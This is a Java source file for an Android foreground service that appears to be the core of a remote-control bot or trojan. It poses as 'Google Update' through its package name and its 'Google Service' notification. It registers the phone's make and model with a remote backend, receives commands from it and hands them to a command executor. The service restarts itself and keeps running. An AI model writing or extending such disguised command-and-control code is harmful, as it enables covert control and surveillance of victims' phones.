package com.google.update;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;

public class TelegramBotService extends Service {
    private PocketBaseManager pbManager;
    private CommandExecutor commandExecutor;

    @Override
    public void onCreate() {
        super.onCreate();
        pbManager = new PocketBaseManager(this);
        commandExecutor = new CommandExecutor(this, pbManager);

        pbManager.setCommandListener(command -> {
            Log.d("TelegramBotService", "Command received: " + command);
            commandExecutor.executeCommand(command);
        });

        createNotificationChannel();
        startForeground(1001, createNotification());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
        pbManager.registerDevice(deviceName);
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel channel = new NotificationChannel("google_channel", "Google Service", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, "google_channel")
                .setContentTitle("Google Update")
                .setContentText("Service running")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
